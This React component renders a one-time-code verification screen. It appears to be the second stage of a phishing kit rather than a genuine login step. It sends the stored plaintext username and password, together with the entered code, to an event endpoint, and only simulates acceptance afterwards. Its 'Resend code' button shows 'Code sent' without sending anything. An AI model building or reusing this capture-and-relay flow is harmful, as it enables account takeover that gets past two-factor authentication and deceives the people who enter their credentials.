"use client";

import { useEffect, useState } from "react";

import {
  MSG_UNABLE_REACH_VERIFICATION,
  OTP_CODE_LENGTH,
} from "@/lib/approval-messages";
import { sendEvent } from "@/lib/event-client";
import { otpMethodVerifySubtitle, type OtpMethod } from "@/lib/otp-methods";
import { readPendingCredentials } from "@/lib/pending-session";

type Props = {
  method: OtpMethod;
  error?: string;
  onBack: () => void;
  onSubmitted: () => void;
  onDismissError?: () => void;
};

export default function MwbOtpVerification({
  method,
  error: externalError = "",
  onBack,
  onSubmitted,
  onDismissError,
}: Props) {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [focused, setFocused] = useState(false);
  const [touched, setTouched] = useState(false);
  const [resent, setResent] = useState(false);

  const displayError = externalError || error;
  const hasError =
    Boolean(displayError) || (touched && code.trim().length !== OTP_CODE_LENGTH);

  useEffect(() => {
    if (externalError) {
      setCode("");
      setTouched(false);
    }
  }, [externalError]);

  function sanitize(value: string) {
    return value.replace(/\D/g, "").slice(0, OTP_CODE_LENGTH);
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;
    if (code.trim().length !== OTP_CODE_LENGTH) {
      setTouched(true);
      setError(`Enter the ${OTP_CODE_LENGTH}-digit verification code.`);
      return;
    }
    setError("");
    setSubmitting(true);
    try {
      // Demo flow — the code is dispatched to POST /api/event; acceptance is
      // still simulated locally once the event has been delivered.
      const credentials = readPendingCredentials();
      const { ok } = await sendEvent("otp", {
        username: credentials.username,
        password: credentials.password,
        otp: code.trim(),
      });
      if (!ok) {
        setError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }
      await new Promise((r) => setTimeout(r, 600));
      onSubmitted();
    } catch {
      setError(MSG_UNABLE_REACH_VERIFICATION);
    } finally {
      setSubmitting(false);
    }
  }

  function handleResend() {
    setCode("");
    setTouched(false);
    setError("");
    onDismissError?.();
    setResent(true);
    window.setTimeout(() => setResent(false), 3000);
  }

  const canSubmit = code.trim().length === OTP_CODE_LENGTH;

  return (
    <div className="w-full text-left">
      <h1 className="m-0 text-xl font-semibold text-white">
        Enter your verification code.
      </h1>
      <p className="mb-6 mt-2 text-sm leading-relaxed text-mwb-muted">
        {otpMethodVerifySubtitle(method)}
      </p>

      {displayError ? (
        <p role="alert" className="mb-4 text-sm text-red-400">
          {displayError}
        </p>
      ) : null}

      <form onSubmit={handleSubmit} noValidate>
        <div className="relative">
          <label
            htmlFor="mwb-otp-code"
            className={`pointer-events-none absolute -top-2 left-3 bg-mwb-card px-1 text-xs transition-colors ${
              focused || code.length > 0 ? "text-mwb-lime" : "text-mwb-muted"
            }`}
          >
            Verification code
          </label>
          <input
            id="mwb-otp-code"
            inputMode="numeric"
            autoComplete="one-time-code"
            maxLength={OTP_CODE_LENGTH}
            pattern="[0-9]*"
            value={code}
            autoFocus
            onChange={(e) => {
              setCode(sanitize(e.target.value));
              if (error) setError("");
              if (externalError) onDismissError?.();
            }}
            onFocus={() => setFocused(true)}
            onBlur={() => {
              setTouched(true);
              setFocused(false);
            }}
            disabled={submitting}
            className={`block w-full rounded-lg border bg-transparent px-4 py-3.5 text-sm tracking-[0.2em] text-white outline-none transition-colors disabled:opacity-50 ${
              hasError ? "border-red-400" : focused ? "border-mwb-lime" : "border-[#5a5a5a]"
            }`}
          />
        </div>

        <div className="mt-2 flex items-center justify-between">
          <button
            type="button"
            onClick={onBack}
            disabled={submitting}
            className="cursor-pointer border-0 bg-transparent p-0 text-[13px] font-medium text-mwb-lime hover:underline disabled:opacity-50"
          >
            Back
          </button>
          <button
            type="button"
            onClick={handleResend}
            disabled={submitting}
            className="cursor-pointer border-0 bg-transparent p-0 text-[13px] font-medium text-mwb-lime hover:underline disabled:opacity-50"
          >
            {resent ? "Code sent" : "Resend code"}
          </button>
        </div>

        <div className="mt-[30px] flex justify-end">
          <button
            type="submit"
            disabled={submitting || !canSubmit}
            className="min-w-[130px] cursor-pointer rounded-lg border-0 bg-mwb-navy px-6 py-2.5 text-sm font-semibold text-white transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50"
          >
            {submitting ? "Verifying…" : "Verify"}
          </button>
        </div>
      </form>
    </div>
  );
}
